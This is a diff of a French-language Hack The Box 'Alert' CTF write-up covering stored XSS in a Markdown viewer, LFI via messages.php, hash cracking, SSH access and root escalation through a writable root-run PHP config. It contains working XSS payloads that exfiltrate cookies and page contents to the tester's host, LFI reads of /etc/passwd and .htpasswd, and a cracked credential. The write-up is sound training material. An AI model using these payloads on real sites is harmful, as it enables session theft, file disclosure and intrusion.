@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
-description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
-tags: ["Easy"]
+summary: "Alert (HTB Easy) : XSS stockée, exfiltration JS, LFI, accès SSH et élévation jusqu’à root."
+description: "Writeup de Alert (HTB Easy) : exploitation d’une XSS stockée, exfiltration de données, LFI, récupération d’identifiants et escalade de privilèges jusqu’à root."
+tags: ["HTB Easy","web","xss","lfi","ssh","apache"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -26,7 +26,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Alert"
+  alt: "Machine Alert HTB Easy exploitée via XSS stockée, LFI et escalade de privilèges jusqu’à root"
   caption: ""
   relative: true
   hidden: false
@@ -37,7 +37,7 @@ cover:
 ctf:
   platform: "Hack The Box"
   machine: "Alert"
-  difficulty: "Easy | Medium | Hard"
+  difficulty: "Easy"
   target_ip: "10.129.x.x"
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "2h"
@@ -122,13 +122,13 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-La machine **Alert** de Hack The Box, classée **HTB Easy**, propose un scénario centré sur l’exploitation d’une application web vulnérable, combinée à une mauvaise gestion des accès et des permissions sur le système.
+La machine **Alert** de Hack The Box, classée **HTB Easy**, propose un scénario web basé sur l’exploitation d’un **Markdown Viewer vulnérable**, combiné à une mauvaise gestion des accès côté serveur.
 
-Tu y découvres comment exploiter un point d’entrée côté application pour obtenir des informations sensibles, puis les utiliser afin d’accéder à la machine.
+Tu y découvres comment transformer une simple fonctionnalité d’upload en un point d’entrée exploitable, en injectant du JavaScript pour obtenir un accès indirect aux ressources de l’application.
 
-Ce writeup détaille chaque étape, de l’énumération initiale jusqu’à l’escalade de privilèges, avec une approche claire et reproductible adaptée aux débutants en CTF.
+Ce writeup te guide pas à pas pour exploiter une **XSS stockée**, exfiltrer des données, identifier une **LFI**, puis utiliser les informations récupérées pour obtenir un accès SSH.
 
-Dans ce writeup, tu identifies une faille exploitable dans l’application, récupères des identifiants valides, obtiens un accès SSH, puis élèves tes privilèges jusqu’à root.
+Tu poursuis ensuite avec une escalade de privilèges basée sur une faiblesse dans la gestion des permissions, jusqu’à obtenir un accès **root** sur la machine.
 
 ---
 
@@ -454,26 +454,32 @@ Port 80 (http)
 === mon-subdomains alert.htb END ===
 ```
 
-
-
 ## Prise pied
 
-Lorsque tu accèdes à `http://alert.htb`, tu arrives sur la page **“Markdown Viewer”**, qui est la première page affichée par l’application.
+### Points d’entrée identifiés
+
+À ce stade, l’énumération met en évidence un service web exposé sur le port 80, avec une application nommée **Markdown Viewer**.
+
+Plusieurs chemins attirent également l’attention, notamment `messages.php`, `contact.php` et le répertoire `/uploads/`.
+
+Tu concentres donc ton analyse sur cette application web, qui représente le point d’entrée le plus prometteur.
+
+En accédant à `http://alert.htb`, tu arrives directement sur la page **“Markdown Viewer”**, qui constitue l’interface principale.
 
 
 
 ![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)
 
-Sur cette page, un menu te permet de naviguer entre plusieurs pages :
- **Markdown Viewer**, **Contact us**, **About us** et **Donate**.
+Sur cette page, un menu te permet de naviguer entre plusieurs sections :  
+**Markdown Viewer**, **Contact us**, **About us** et **Donate**.
 
-La page **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.
-
-C’est cette fonctionnalité d’upload de fichiers `.md` que tu vas explorer dans la suite de l’analyse.
+La section **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.
 
 ### Test du rendu Markdown
 
-Pour commencer, tu peux créer un premier fichier Markdown simple afin de comprendre comment le contenu est traité par l’application.
+Avant de chercher une vulnérabilité, tu commences par comprendre comment l’application traite les fichiers Markdown.
+
+Pour cela, tu peux créer un fichier simple afin d’observer le comportement du rendu.
 
 Par exemple, crée un fichier `test.md` avec le contenu suivant :
 
@@ -485,30 +491,26 @@ Ceci est un test.Ensuite :
 
 Ensuite :
 
-1. Clique sur le bouton **“Browse”**
+1. Clique sur **“Browse”**
 2. Sélectionne ton fichier `test.md`
-3. Clique sur **“View Markdown”** pour uploader et afficher le contenu
+3. Clique sur **“View Markdown”**
 
 Le contenu est alors affiché dans l’interface.
 
 ![Affichage du fichier test.md dans Markdown Viewer après upload sur alert.htb](view-test-md.png)
 
-
-
 > **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.
 
-Ce premier test te permet de valider que :
+Tu confirmes ainsi que :
 
-- les fichiers `.md` sont bien acceptés
-- le contenu est interprété et rendu dans le navigateur
+- les fichiers `.md` sont acceptés
+- le contenu est correctement interprété et affiché
 
-À ce stade, tu contrôles donc directement le contenu affiché dans la page.
+### Test de sécurité du rendu Markdown
 
-### Injection XSS dans le Markdown
+Maintenant que tu contrôles le contenu affiché, l’étape suivante consiste à vérifier si ce contenu est correctement filtré.
 
-Maintenant que tu contrôles le contenu affiché via le fichier `.md`, l’étape suivante consiste à tester si ce contenu est correctement filtré.
-
-Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple :
+Tu modifies ton fichier `test.md` en y ajoutant un script :
 
 ```markdown
 # Test XSS
@@ -516,11 +518,7 @@ Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple
 <script>alert(1)</script>
 ```
 
-Ensuite, répète les mêmes étapes :
-
-1. Clique sur **“Browse”**
-2. Sélectionne ton fichier `test.md`
-3. Clique sur **“View Markdown”**
+Tu répètes ensuite les mêmes étapes d’upload.
 
 
 #### Observation du comportement
@@ -529,41 +527,41 @@ Lors de l’affichage du message, une alerte JavaScript apparaît.
 
 ![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)
 
-Cela signifie que le code JavaScript est exécuté directement dans ton navigateur.
+Le code JavaScript est donc exécuté directement dans le navigateur.
 
 #### Analyse
 
-Ce comportement indique clairement que :
+Ce comportement montre que :
 
-- le contenu Markdown n’est **pas correctement filtré**
-- les balises `<script>` sont **interprétées par le navigateur**
-- il est possible d’injecter et d’exécuter du JavaScript
+- le contenu Markdown n’est pas filtré correctement
+- les balises `<script>` sont interprétées
+- il est possible d’exécuter du JavaScript arbitraire
 
-Tu es donc face à une **faille XSS (Cross-Site Scripting)**, une vulnérabilité qui permet d’injecter et d’exécuter du code JavaScript dans le navigateur d’un utilisateur.
+Tu es donc face à une faille XSS (Cross-Site Scripting).
 
-Dans ce cas, il s’agit très probablement d’une **XSS stockée (Stored XSS)**, c’est-à-dire que le code malveillant est enregistré par l’application et exécuté à chaque affichage.
+Dans ce cas précis, il s’agit d’une XSS stockée, car le contenu est enregistré et rejoué lors de l’affichage.
 
 #### Impact
 
 À ce stade, tu peux :
 
-- exécuter du JavaScript dans ton propre navigateur
-- modifier dynamiquement le contenu de la page
+- exécuter du JavaScript dans ton navigateur
+- modifier le contenu de la page
 - interagir avec l’application côté client
 
-Mais surtout, si ce contenu est consulté par un autre utilisateur, le script s’exécutera dans **son navigateur, avec ses droits**.
+Mais surtout, si un autre utilisateur consulte ce contenu, le script s’exécute dans son navigateur avec ses privilèges.
 
-Si tu parviens à faire lire ce contenu par un **administrateur**, tu pourras alors exécuter du code dans **son navigateur**, comme si tu étais **administrateur de l’application**, avec les mêmes droits et possibilités.
+Si tu parviens à cibler un administrateur, tu peux alors exécuter du code dans son contexte et accéder à des ressources normalement inaccessibles.
+
+C’est ce qui permet de passer à une exploitation concrète.
 
 ### Test d’exfiltration via XSS
 
-Maintenant que tu sais que tu peux exécuter du JavaScript dans ton navigateur, tu peux tester s’il est possible d’extraire des informations depuis la page.
+La XSS est maintenant confirmée. L’objectif n’est plus simplement d’afficher une alerte, mais d’exploiter cette vulnérabilité pour récupérer des informations.
 
-Une première idée consiste à récupérer les cookies de session, car ils sont utilisés par l’application pour reconnaître un utilisateur déjà connecté. Les récupérer peut donc permettre d’usurper son identité.
+Une première étape consiste à vérifier si le navigateur peut envoyer des données vers ta machine.
 
-#### Création du fichier .md pour récupérer les cookies
-
-Pour cela, tu peux modifier ton fichier `test.md` avec le contenu suivant :
+Pour cela, tu modifies ton fichier `test.md` avec le contenu suivant :
 
 ```markdown
 # Alert Test
@@ -575,80 +573,93 @@ new Image().src="http://10.10.x.x:8000/?c="+document.cookie;
 </script>
 ```
 
-La ligne `new Image().src="http://10.10.x.x:8000/?c="+document.cookie;` demande au navigateur de contacter ta machine Kali en utilisant l’adresse IP `10.10.x.x` de ton interface `tun0`.
+Ce code force le navigateur à contacter ton serveur en ajoutant les cookies dans l’URL.
 
-Les cookies récupérés sont ceux du site que tu es en train de consulter, ici la page du **Markdown Viewer (`visualizer.php`) sur `alert.htb`**.
+Même si l’image n’existe pas, la requête HTTP est bien envoyée, ce qui permet de récupérer ces données côté attaquant.
 
-Pour vérifier concrètement ce comportement, tu peux lancer un serveur sur ta machine Kali afin de visualiser les requêtes envoyées par le navigateur.
+#### Mise en place du serveur de réception
 
-#### Récupération sur la machine Kali
-
-Pour vérifier que les cookies sont bien envoyés vers ta machine, tu peux mettre en place un listener sur Kali.
-
-Pour cela, lance un serveur HTTP simple sur le port 8000 :
+Sur ta machine Kali, tu lances un serveur HTTP simple :
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Ce serveur va écouter les connexions entrantes sur ton interface `tun0`.
+Puis tu charges à nouveau ton fichier Markdown.
 
-Recharge ensuite ton fichier Markdown dans l’application.
+**Observation**
 
-Dans le terminal où le serveur est lancé, tu observes une requête entrante :
+Dans le terminal, tu observes une requête entrante :
 
 ```bash
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
 ```
 
-La requête est bien reçue par ton serveur, ce qui confirme que le script est exécuté et que le navigateur contacte ta machine.
+La requête est bien reçue, ce qui confirme que :
+
+- le script est exécuté dans le navigateur
+- une communication avec ta machine est possible
+
+Dans ce cas précis, le paramètre `c` est vide, car aucun cookie exploitable n’est présent.
 
 On remarque également que l’adresse IP affichée (`10.10.x.x`) correspond à ta propre machine (interface `tun0`).
 
-Cela prouve que c’est bien **ton navigateur** qui exécute le script et envoie la requête vers ton serveur.
+**Conclusion**
 
-Cependant, la valeur du paramètre `c` est vide : aucun cookie n’est envoyé dans ce cas.
+Même si aucun cookie n’est récupéré ici, ce test valide un point essentiel : tu peux exfiltrer des données depuis le navigateur.
 
-Cela s’explique par le fait que tu es actuellement dans un contexte non authentifié ou sans cookie exploitable.
+Ce mécanisme servira ensuite à récupérer du contenu plus intéressant, notamment depuis l’application elle-même.
 
-Le mécanisme fonctionne donc correctement, mais il faudra exécuter ce code dans un contexte plus intéressant, par exemple celui d’un administrateur, pour récupérer des informations utiles.
 
-------
+
+
 
 ### Passage au contexte administrateur
 
-L’application propose une fonctionnalité **“Contact us”** permettant de transmettre un lien à un administrateur.
+### Passage au contexte administrateur
 
-L’objectif devient alors clair :
+L’application propose une fonctionnalité **“Contact us”**, qui permet d’envoyer un lien à un administrateur.
+
+Sur la page **About Us**, il est précisé que l’administrateur est chargé de consulter les messages reçus :
+
+![Page About Us indiquant que l’administrateur consulte les messages sur alert.htb](about-us.png)
+
+Tu peux donc utiliser ce mécanisme pour faire exécuter ton payload XSS dans un contexte plus intéressant.
+
+L’objectif est alors de :
 
 - créer un message contenant un payload XSS
-- récupérer son lien via “Share”
-- envoyer ce lien à l’administrateur
+- récupérer le lien via la fonction “Share”
+- transmettre ce lien à l’administrateur
 
-Lorsque l’admin ouvre le message, le JavaScript s’exécute **dans son navigateur**, avec ses privilèges.
+Lorsque l’administrateur ouvre le message, le JavaScript s’exécute dans son navigateur, avec ses privilèges.
 
 ------
 
 ### Exfiltration de contenu avec JavaScript
 
-Une fois le XSS confirmé, on peut aller plus loin que de simples alertes.
+Parmi les pages identifiées lors de l’énumération, `messages.php` attire particulièrement l’attention.
 
-L’idée est d’utiliser JavaScript pour :
+Cette page est liée au système de messagerie de l’application, et il est probable qu’elle soit utilisée par l’administrateur pour consulter les messages reçus via **“Contact us”**.
 
-1. envoyer une requête vers une ressource interne
-2. récupérer son contenu
-3. l’exfiltrer vers notre machine
+Elle constitue donc une cible pertinente pour tester une première exfiltration de contenu.
 
-Un premier test consiste à récupérer la page suivante :
+Le principe est le suivant :
 
-```
+- envoyer une requête vers une page interne accessible par l’admin
+- récupérer son contenu
+- renvoyer ces données vers ta machine
+
+Un premier test consiste à cibler la page suivante 
+
+```txt
 http://alert.htb/messages.php
 ```
 
 Payload utilisé :
 
-```
+```html
 <script>
 fetch('http://alert.htb/messages.php')
   .then(r => r.text())
@@ -658,28 +669,84 @@ fetch('http://alert.htb/messages.php')
 </script>
 ```
 
-👉 Explication :
+**Explication**
 
-- `fetch()` récupère le contenu de la page
-- `r.text()` convertit la réponse en texte
-- `btoa()` encode les données en base64
-- `new Image().src` envoie les données vers notre serveur
+- `fetch()` envoie une requête HTTP vers la ressource cible
+- la réponse est récupérée sous forme de texte avec `r.text()`
+- `btoa()` encode les données en base64 pour faciliter leur transmission
+- `new Image().src` permet d’envoyer ces données vers ton serveur
 
-Lorsque l’administrateur charge la page piégée, une requête est envoyée vers notre machine contenant les données récupérées.
+Ce code est exécuté dans le navigateur de l’administrateur.
+ Il récupère le contenu de `messages.php`, puis l’exfiltre vers ta machine.
 
-------
 
-### Découverte d’un point d’entrée LFI
 
-La réponse obtenue révèle la présence de paramètres intéressants :
+### Analyse du contenu récupéré
 
+Lorsque l’administrateur ouvre ton lien, une requête contenant des données encodées en base64 apparaît dans ton listener :
+
+```bash
+10.129.x.x - - [date] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
 ```
+
+Tu peux décoder ce contenu avec :
+
+```bash
+echo "..." | base64 -d
+```
+
+Tu obtiens alors :
+
+```html
+<h1>Messages</h1>
+<ul>
+  <li>
+    <a href='messages.php?file=2024-03-10_15-48-34.txt'>
+      2024-03-10_15-48-34.txt
+    </a>
+  </li>
+</ul>
+```
+
+**Interprétation**
+
+Ce résultat met en évidence un comportement important :
+
+- la page liste des fichiers
+- un paramètre `file` est utilisé pour afficher leur contenu
+- ce paramètre semble directement contrôlé par l’utilisateur
+
+Cela révèle un point d’entrée exploitable :
+
+```bash
 messages.php?file=...
 ```
 
-Cela suggère que l’application permet de lire des fichiers côté serveur.
+**Conclusion**
 
-On teste alors une inclusion de fichier classique :
+Tu es face à un vecteur potentiel de **Local File Inclusion (LFI)**.
+
+Si ce paramètre n’est pas correctement sécurisé, il pourrait permettre de lire des fichiers arbitraires sur le serveur.
+
+On va donc tester cette hypothèse dans la suite de l’exploitation.
+
+
+
+### Découverte d’un point d’entrée LFI
+
+L’analyse du contenu exfiltré met en évidence l’utilisation du paramètre suivant :
+
+```txt
+messages.php?file=...
+```
+
+Ce paramètre est utilisé pour charger le contenu des messages.
+
+Dans ce type de mécanisme, il est fréquent que la valeur soit utilisée directement côté serveur pour lire un fichier.
+
+On peut donc tester une tentative d’inclusion de fichier en utilisant un chemin relatif.
+
+Un test classique consiste à cibler le fichier `/etc/passwd` :
 
 ```
 ../../../../etc/passwd
@@ -687,7 +754,7 @@ On teste alors une inclusion de fichier classique :
 
 Payload final :
 
-```
+```html
 <script>
 fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
   .then(r => r.text())
@@ -697,36 +764,173 @@ fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
 </script>
 ```
 
-------
+**Résultat**
 
-### Validation de la lecture de fichiers
+Après exécution du payload par l’administrateur, une nouvelle requête est reçue sur ton serveur.
 
-Après envoi du lien à l’administrateur, on reçoit sur notre serveur le contenu encodé.
-
-Une fois décodé, on obtient :
+Une fois décodées, les données retournées contiennent :
 
 ```
 root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
 ```
 
-👉 La vulnérabilité est confirmée :
+**Validation**
 
-- XSS stockée → exécution côté admin
-- - LFI via `messages.php`
-- = **lecture arbitraire de fichiers sur le serveur**
+Ce résultat confirme que :
 
-------
+- le paramètre `file` permet de lire des fichiers arbitraires
+- aucun filtrage efficace n’est appliqué
+- l’application est vulnérable à une **Local File Inclusion (LFI)**
+
+**Impact**
+
+Tu peux désormais accéder à des fichiers sensibles du système ou de l’application.
+
+Cela ouvre la voie à la récupération d’identifiants et à une compromission complète de la machine.
+
+### Découverte d’un point d’entrée exploitable
+
+À ce stade, tu peux lire des fichiers locaux sur le serveur via la LFI.
+
+Tu peux donc cibler directement des fichiers sensibles, en particulier les fichiers de configuration.
+
+Un bon réflexe consiste à analyser la configuration Apache.
+
+Tu récupères le fichier :
+
+/etc/apache2/apache2.conf
+
+Tu identifies notamment la directive suivante :
+
+```bash
+IncludeOptional sites-enabled/*.conf
+```
+
+Cela indique que la configuration des virtual hosts est chargée depuis ce répertoire.
+
+Tu poursuis donc avec :
+
+```bash
+/etc/apache2/sites-enabled/000-default.conf
+```
+
+Dans ce fichier, une directive attire ton attention :
+
+```bash
+AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+```
+
+**Interprétation (POINT CLÉ)**
+
+Cette configuration révèle plusieurs éléments importants :
+
+- une authentification HTTP Basic est utilisée
+- un fichier `.htpasswd` est présent
+- son chemin est accessible via ta LFI
+
+Ce type de fichier contient souvent des identifiants exploitables en CTF.
+
+Tu récupères donc son contenu via la LFI :
+
+```txt
+/var/www/statistics.alert.htb/.htpasswd
+```
+
+Après exfiltration :
+
+```bash
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+```
+
+Tu identifies :
+
+- utilisateur : `albert`
+- hash : `$apr1$` (MD5 Apache)
+
+Tu peux maintenant tenter de casser ce hash pour obtenir le mot de passe en clair.
+
+Tu places le hash dans un fichier :
+
+```bash
+echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
+```
+
+Puis tu lances `hashcat` :
+
+```bash
+hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Le mot de passe est retrouvé :
+
+```txt
+manchesterunited
+```
+
+Tu obtiens donc les identifiants :
+
+**albert:manchesterunited**
+
+
+
+### Test des identifiants
+
+Ces identifiants proviennent d’un `.htpasswd`, donc initialement destinés à une authentification web.
+
+En pratique, il est toujours recommandé de tester ces identifiants sur tous les services accessibles, notamment SSH.
+
+Tu testes en SSH :
+
+```bash
+ssh albert@alert.htb
+```
+
+L’authentification fonctionne.
+
+Tu obtiens ainsi un accès SSH en tant qu’utilisateur `albert`.
+
+### Récupération du flag
+
+Une fois connecté en SSH, vérifie ton contexte :
+
+```bash
+id
+uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
+```
+
+> Note que l’utilisateur appartient au groupe `management`, ce qui pourrait être utile pour la suite.
+
+Tu listes les fichiers :
+
+```bash
+ls -l
+-rw-r----- 1 root albert 33 Mar 29 13:19 user.txt
+```
+
+Puis tu récupères le flag :
+
+```bash
+cat user.txt
+7e4dxxxxxxxxxxxxxxxxxxxxxxxxxxx31fb
+```
+
+
 
 ### Conclusion de la prise de pied
 
-À ce stade, on dispose :
+À ce stade, tu disposes :
 
-- d’une exécution JavaScript dans le navigateur admin
-- d’un accès indirect aux fichiers du serveur
-- d’un canal d’exfiltration fiable
+- d’une exécution de JavaScript dans le navigateur de l’administrateur
+- d’un accès indirect aux fichiers du serveur via le LFI
+- d’un mécanisme d’exfiltration fiable vers ta machine
 
-👉 Cela constitue une **prise de pied complète côté web**, permettant d’envisager la récupération de credentials ou d’autres fichiers sensibles pour aller plus loin.
+Ces éléments t’ont permis de récupérer des identifiants valides, puis d’obtenir un accès SSH en tant qu’utilisateur `albert`.
+
+Une fois connecté, tu récupères le flag `user.txt`, ce qui confirme que la prise de pied est réussie.
+
+Tu peux donc considérer cette étape comme terminée et passer à la phase suivante : l’escalade de privilèges.
 
 ---
 
@@ -742,7 +946,7 @@ root:x:0:0:root:/root:/bin/bash
 Sorry, user albert may not run sudo on alert.
 ```
 
-L’utilisateur `albert` ne peut exécuter aucune commande en tant que root via sudo.
+Tu élimines une piste souvent rencontrée en CTF et poursuis ton énumération.
 
 ------
 
@@ -775,7 +979,9 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Il s’agit uniquement de binaires système classiques, sans piste d’exploitation directe.
+Il s’agit uniquement de binaires système standards, sans piste d’exploitation directe.
+
+Aucun binaire SUID exploitable dans ce cas.
 
 ------
 
@@ -798,6 +1004,8 @@ getcap -r / 2>/dev/null
 
 Aucune capability exploitable dans ce contexte.
 
+Ces `capabilities` sont liées au réseau et ne permettent pas d’exécuter du code en root.
+
 ------
 
 ### Inspection des tâches cron
@@ -817,7 +1025,7 @@ cat /etc/crontab
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
 
-Rien d’anormal ici, uniquement des tâches système classiques.
+Aucune tâche personnalisée ou modifiable par l’utilisateur n’est présente.
 
 ------
 
@@ -843,6 +1051,8 @@ Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce q
 
 Tu remarques rapidement que les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine.
 
+Ce comportement est fréquent sur les machines CTF.
+
 Cela pose un problème : les fichiers que tu y déposes (scripts, outils, payloads) peuvent disparaître avant d’être exploités.
 
 Il est donc nécessaire de trouver un répertoire :
@@ -864,7 +1074,7 @@ Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement e
 
 ### Analyse automatisée des SUID avec suid3num.py
 
-Pour compléter la recherche manuelle des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement les binaires potentiellement exploitables et de les comparer avec les entrées connues de [GTFOBins](https://gtfobins.org/).
+Pour compléter la recherche manuelle des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement les binaires potentiellement exploitables et de les comparer avec les entrées connues de [GTFOBins](https://gtfobins.org/). Cela permet de gagner du temps par rapport à une analyse manuelle.
 
 Tu le télécharges et l’exécutes depuis `/var/tmp` :
 
@@ -921,7 +1131,10 @@ chmod +x pspy64
 ./pspy64
 ```
 
+pspy64 permet d’observer les processus exécutés par root sans privilèges élevés.
+
 Très rapidement, une activité répétée toutes les minutes attire ton attention :
+
 ```bash
 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
 ```
@@ -953,6 +1166,11 @@ ls -l /opt/website-monitor/config/configuration.php
 -rwxrwxr-x 1 root management ...
 ```
 
+Tu identifies ici une combinaison critique :
+
+- fichier modifiable
+- exécuté par root
+
 L’utilisateur `albert`, membre du groupe `management`, peut donc modifier ce fichier.
 
 Tu affiches ensuite son contenu :
@@ -967,12 +1185,6 @@ define('PATH', '/opt/website-monitor');
 Ce fichier est chargé automatiquement par un script exécuté en tant que root.
 
 **Tu peux donc y injecter du code qui sera exécuté avec les privilèges root.**
-
-
-
-
-
-
 
 
 
@@ -993,6 +1205,8 @@ L’analyse de `monitor.php` a montré que le fichier `configuration.php` est ex
 L’objectif est donc d’y injecter directement du code afin d’exécuter une commande en tant que root.
 
 **Modification de `configuration.php`**
+
+L’objectif est de créer un binaire SUID root pour obtenir un shell privilégié.
 
 Tu modifies directement le fichier :
 
@@ -1036,6 +1250,8 @@ Immédiatement après la sauvegarde :
 
 Ce comportement montre qu’un mécanisme réécrit le fichier en continu, mais que ton payload est exécuté précisément au moment où tu enregistres les modifications.
 
+Le timing est important : ton payload est exécuté avant que le fichier ne soit restauré.
+
 Tu vérifies alors la présence du binaire :
 
 ```bash
@@ -1067,6 +1283,8 @@ Cela suffit pour exécuter des commandes avec les privilèges root, notamment po
 mybashroot-5.0# cat /root/root.txt
 6276xxxxxxxxxxxxxxxxxxxxxxxxc253
 ```
+
+Tu confirms ainsi l’accès root sur la machine.
 
 **Le flag root est récupéré avec succès, ce qui marque la fin de l’exploitation et du CTF.**
 
